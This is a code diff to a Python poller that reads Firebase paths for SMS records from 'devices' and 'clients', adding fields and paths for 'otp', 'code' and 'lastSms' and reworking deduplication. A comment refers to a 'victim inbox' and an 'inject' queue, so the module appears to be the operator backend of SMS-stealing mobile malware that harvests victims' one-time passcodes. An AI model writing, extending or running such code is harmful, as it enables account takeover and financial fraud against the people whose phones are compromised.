@@ -21,7 +21,7 @@ POLL_INTERVAL_SEC = 0.3
 POLL_FETCH_TIMEOUT_SEC = 4.0
 SNAPSHOT_TIMEOUT_SEC = 8.0
 MONITORING_START_SNAPSHOT_SEC = 6.0
-MAX_POLL_PATHS_FALLBACK = 48
+MAX_POLL_PATHS_FALLBACK = 96
 POLL_PROFILE_CONCURRENCY = 8
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
@@ -37,8 +37,33 @@ SMS_CHILD_PATHS = (
     "logs",
     "history",
 )
-SENDER_FIELDS = ("sender", "from", "address", "phone", "number", "fromNumber", "from_number")
-BODY_FIELDS = ("message", "body", "text", "content", "msg", "sms", "smsBody")
+SENDER_FIELDS = (
+    "sender",
+    "from",
+    "address",
+    "phone",
+    "number",
+    "fromNumber",
+    "from_number",
+    "fromAddress",
+    "senderId",
+    "sender_id",
+)
+BODY_FIELDS = (
+    "message",
+    "body",
+    "text",
+    "content",
+    "msg",
+    "sms",
+    "smsBody",
+    "smsText",
+    "sms_text",
+    "messageBody",
+    "otp",
+    "code",
+)
+SINGLETON_SMS_SUFFIXES = ("/lastSms", "/last_sms", "/latest_sms", "/otp", "/lastMessage")
 TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
@@ -195,8 +220,27 @@ def _parse_body_date(text: str) -> datetime | None:
         return None
 
 
+def _is_singleton_sms_path(firebase_key: str) -> bool:
+    key = (firebase_key or "").rstrip("/")
+    return any(key.endswith(suffix) for suffix in SINGLETON_SMS_SUFFIXES)
+
+
+def _record_dedup_key(record: dict[str, Any]) -> str:
+    """Singleton nodes (lastSms/otp) reuse the same Firebase key — dedupe by content."""
+    firebase_key = str(record.get("firebase_key") or "")
+    if _is_singleton_sms_path(firebase_key):
+        sender = str(record.get("sender") or "")
+        message = str(record.get("message") or "")
+        return f"{firebase_key}|{sender}|{message}"
+    return firebase_key
+
+
 def _is_old_for_monitoring(record: dict[str, Any], profile: MonitorProfile) -> bool:
     """Skip Firebase backlog — only SMS at/after monitoring start."""
+    firebase_key = str(record.get("firebase_key") or "")
+    if _is_singleton_sms_path(firebase_key):
+        return False
+
     started = profile.started_at
     if not started:
         return False
@@ -312,7 +356,7 @@ def _is_poll_noise_record(sender: str, message: str) -> bool:
         return True
     if "astik test ok" in body_l and "module alive" in body_l:
         return True
-    if sender_l == "unknown" and len(body) <= 8 and not re.search(r"\d{4,}", body):
+    if sender_l == "unknown" and len(body) <= 3 and not re.search(r"\d", body):
         return True
     return False
 
@@ -331,6 +375,19 @@ def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
     if isinstance(nested, dict):
         sender = sender or _first_field(nested, SENDER_FIELDS)
         body = body or _first_field(nested, BODY_FIELDS)
+
+    if not body:
+        for field in ("otp", "code", "data"):
+            raw = value.get(field)
+            if raw is not None and str(raw).strip():
+                body = str(raw).strip()
+                break
+        if isinstance(nested, dict) and not body:
+            for field in ("otp", "code", "data"):
+                raw = nested.get(field)
+                if raw is not None and str(raw).strip():
+                    body = str(raw).strip()
+                    break
 
     if not body:
         return None
@@ -392,6 +449,19 @@ def _extract_sms_records(path: str, value: Any) -> list[dict[str, Any]]:
                 parsed = _parse_sms_entry(f"{path}/{index}", item)
                 if parsed:
                     records.append(parsed)
+        return records
+
+    if isinstance(value, str):
+        text = value.strip()
+        if text and not _is_poll_noise_record("Unknown", text):
+            records.append(
+                {
+                    "firebase_key": path,
+                    "sender": "Unknown",
+                    "message": text,
+                    "received_at": None,
+                }
+            )
         return records
 
     if not isinstance(value, dict):
@@ -464,12 +534,11 @@ def _generate_sms_paths(device: Device) -> list[str]:
                 seen_paths.add(device_path)
                 paths.append(device_path)
 
-        for top in ("sms", "SMS", "inbox", "Inbox", "data", "logs"):
+        for top in ("sms", "SMS", "inbox", "Inbox", "data", "logs", "messages"):
             path = f"{top}/{device_id}"
             if path not in seen_paths:
                 seen_paths.add(path)
                 paths.append(path)
-        # Skip messages/{device_id} — Virtus inject/__OUT__ queue, not victim inbox.
 
         for parent in SMS_PARENT_PATHS:
             for suffix in ("lastSms", "last_sms", "latest_sms", "otp", "lastMessage"):
@@ -534,8 +603,42 @@ async def _fetch_paths_parallel(
 def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
     deduped: dict[str, dict[str, Any]] = {}
     for record in records:
-        deduped[record["firebase_key"]] = record
+        deduped[_record_dedup_key(record)] = record
     return list(deduped.values())
+
+
+def _build_priority_sms_paths(device: Device) -> list[str]:
+    priority: list[str] = []
+    if device.firebase_key:
+        fk = device.firebase_key.strip("/")
+        priority.extend(
+            [
+                fk,
+                f"{fk}/sms",
+                f"{fk}/messages",
+                f"{fk}/lastSms",
+                f"{fk}/inbox",
+                f"{fk}/otp",
+            ]
+        )
+    for device_id in _device_ids(device):
+        priority.extend(
+            [
+                f"clients/{device_id}/sms",
+                f"clients/{device_id}/messages",
+                f"clients/{device_id}/lastSms",
+                f"clients/{device_id}/otp",
+                f"clients/{device_id}/inbox",
+                f"devices/{device_id}/sms",
+                f"devices/{device_id}/messages",
+                f"devices/{device_id}/lastSms",
+                f"messages/{device_id}",
+                f"sms/{device_id}",
+                f"inbox/{device_id}",
+                f"data/{device_id}/sms",
+            ]
+        )
+    return priority
 
 
 _poll_cycle: dict[int, int] = {}
@@ -553,48 +656,10 @@ async def fetch_firebase_sms_for_device(
     _poll_cycle[device.id] = cycle
     force_full = force_full or cycle % 4 == 0
 
+    priority = _build_priority_sms_paths(device)
     cached_paths = [] if force_full else get_cached_sms_paths(device)
-    if cached_paths:
-        cached_records, hit_paths = await _fetch_paths_parallel(
-            root,
-            cached_paths,
-            timeout=timeout,
-        )
-        if cached_records:
-            if hit_paths:
-                set_cached_sms_paths(device, hit_paths)
-            return _dedupe_records(cached_records)
-
-    all_paths = _generate_sms_paths(device)
-    priority: list[str] = []
-    if device.firebase_key:
-        fk = device.firebase_key.strip("/")
-        priority.extend(
-            path for path in (
-                fk,
-                f"{fk}/sms",
-                f"{fk}/messages",
-                f"{fk}/lastSms",
-                f"{fk}/inbox",
-            )
-            if path in all_paths or True
-        )
-    for device_id in _device_ids(device):
-        priority.extend(
-            [
-                f"clients/{device_id}/sms",
-                f"clients/{device_id}/messages",
-                f"clients/{device_id}/lastSms",
-                f"clients/{device_id}/inbox",
-                f"devices/{device_id}/sms",
-                f"devices/{device_id}/messages",
-                f"devices/{device_id}/lastSms",
-                f"sms/{device_id}",
-                f"inbox/{device_id}",
-                f"data/{device_id}/sms",
-            ]
-        )
-    ordered = list(dict.fromkeys(priority + all_paths))[:MAX_POLL_PATHS_FALLBACK]
+    all_paths = _generate_sms_paths(device) if force_full else []
+    ordered = list(dict.fromkeys(priority + cached_paths + all_paths))[:MAX_POLL_PATHS_FALLBACK]
     all_records, hit_paths = await _fetch_paths_parallel(root, ordered, timeout=timeout)
     if hit_paths:
         set_cached_sms_paths(device, hit_paths)
@@ -626,7 +691,7 @@ async def snapshot_firebase_sms_seen(
     keys: set[str] = set()
     ignored = 0
     for record in records:
-        fk = record["firebase_key"]
+        fk = _record_dedup_key(record)
         keys.add(fk)
         if fk in previous_seen:
             continue
@@ -806,7 +871,7 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
             return 0
 
         seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
-        new_records = [record for record in records if record["firebase_key"] not in seen]
+        new_records = [record for record in records if _record_dedup_key(record) not in seen]
         if not new_records:
             return 0
 
@@ -815,18 +880,19 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
             new_records,
             key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
         ):
+            dedup_key = _record_dedup_key(record)
             if _is_old_for_monitoring(record, profile):
-                new_keys.add(record["firebase_key"])
+                new_keys.add(dedup_key)
                 continue
 
             received_at = record.get("received_at")
             sender = record["sender"]
             message = record["message"]
             if _is_poll_noise_record(sender, message):
-                new_keys.add(record["firebase_key"])
+                new_keys.add(dedup_key)
                 continue
             if _is_outgoing_firebase_log(sender, message):
-                new_keys.add(record["firebase_key"])
+                new_keys.add(dedup_key)
                 continue
 
             asyncio.create_task(
@@ -841,7 +907,7 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
                 received_at=received_at,
             )
             db.commit()
-            new_keys.add(record["firebase_key"])
+            new_keys.add(dedup_key)
             processed += 1
 
         if new_keys:
